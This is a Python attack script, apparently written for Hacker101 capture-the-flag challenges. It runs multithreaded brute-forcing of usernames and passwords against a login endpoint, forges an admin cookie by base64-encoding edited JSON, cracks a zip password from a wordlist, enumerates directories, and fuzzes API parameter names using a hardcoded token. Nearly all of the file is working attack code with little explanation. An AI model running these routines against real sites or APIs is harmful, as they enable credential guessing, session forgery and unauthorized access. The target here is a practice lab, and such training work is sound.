import requests
from concurrent.futures import ThreadPoolExecutor  # multithreading, much faster
import zipfile
import base64

path = "./wordlists/"
un700 = "user700.txt"
un10K = "names10000.txt"
un80K = "user80000.txt"
pw200 = "pw200.txt"
pw1K = "pw1000.txt"
pw10K = "pw10000.txt"
pw12K = "pw12000.txt"
pw100K = "pw100000.txt"
pw1M = "pw1M.txt"
dir4K = "dir4600.txt"


def force_usernames():
    def try_un(name):
        r = requests.post(
            URL,
            data={
                "username": name,
                "password": "haha",
            },
        )
        if un_fail_string not in r.text:
            print(name)

    with ThreadPoolExecutor(100) as tpe:
        for idx, name in enumerate(open(path + un700).readlines()):
            if idx % 100 == 0:
                print("Trying username #", idx)
            tpe.submit(try_un, name.strip())


def force_password(un):
    def try_pw(pw):
        r = requests.post(URL, data={"username": un, "password": pw})
        if pw_fail_string not in r.text:
            print(pw)

    with ThreadPoolExecutor(100) as tpe:
        for idx, pw in enumerate(open(path + pw1K).readlines()):
            if idx % 100 == 0:
                print("Trying password #", idx)
            tpe.submit(try_pw, pw.strip())
    print("Finished password list")


def cookie_stuff():
    cookie = b"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D"
    c_pad = b"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0="
    pt = b'{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}'
    print(base64.b64encode(pt))


def zip_cracking():
    obj = zipfile.ZipFile(filename)
    for idx, pw in enumerate(open(path + pw10K).readlines()):
        if idx % 10000 == 0:
            print("Trying password #", idx)
        try:
            obj.extractall(pwd=bytes(pw.strip(), encoding="utf-8"))
            print(pw)
            return True
        except:
            continue
    print("Finished password list")


filename = "my_secure_files_not_for_you.zip"
# zip_cracking()
# force_usernames()
# force_password("access")
# cookie_stuff()


def directory_finding():
    def try_path(route):
        dir = requests.get(URL + route)
        if dir.status_code != 404:
            print(dir.status_code, "/" + route)

    for i in range(100):
        if i % 10 == 0:
            print("trying", i)
        try_path(f"v{i}")

    # with ThreadPoolExecutor(10) as tpe:
    # for idx, route in enumerate(open(path + dir4K).readlines()):
    #     if idx % 100 == 0:
    #         print("Trying directory #", idx)
    #         # tpe.submit(try_path, route.strip())
    #     try_path(route.strip())


# for swag-shop - there is api/sessions, api/stock, and api/user (400)

# directory_finding()

URL = "https://9461a2a1ad7b539e431d7ee288bdf1ab.ctf.hacker101.com/api/v1/user"
ep_fail = '{"error":"No updatable fields supplied"}'


def user_update():
    def try_field(field, i):
        response = requests.put(
            URL,
            headers={"x-token": "04d88d27dbd55281f0d8808336b67960"},
            params={field: "01234"},
        )
        if response.status_code != 400:
            print(response.status_code, "/" + field)
        if i == 0:
            print(response.text)

    for idx, field in enumerate(open(path + "userfield6000.txt").readlines()):
        if idx % 100 == 0:
            print("trying", idx)
        try_field(field, idx)


user_update()
